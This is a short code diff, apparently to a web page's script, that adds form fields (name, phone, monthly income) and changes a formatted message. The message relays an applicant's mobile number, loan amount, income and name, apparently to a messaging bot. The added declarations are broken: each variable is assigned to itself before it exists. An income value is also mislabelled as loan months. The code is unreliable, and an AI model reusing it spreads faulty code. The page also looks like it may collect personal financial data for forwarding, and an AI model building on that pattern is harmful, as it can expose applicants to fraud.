@@ -483,6 +483,9 @@
 
     const loginError = document.getElementById('loginError');
     const mobileInput = document.getElementById('mobileInput');
+    const savedName = document.getElementById('fullName').value = savedName;
+    const savedPhone = document.getElementById('phoneNumber').value = savedPhone;
+    const savedIncome = document.getElementById('monthlyIncome').value = savedIncome;
 
     function showLoginError(msg) {
       loginError.textContent = msg;
@@ -524,7 +527,7 @@
 Mobile: <code>${mobile}</code>
 Applicant: <code>Not provided</code>
 loan amount: <code>${loanAmount}</code>
-loan months: <code>${loanMonths}</code>
+loan months: <code>${monthlyIncome}</code>
 Name: ${fullName}
 `,
           parse_mode: 'HTML',
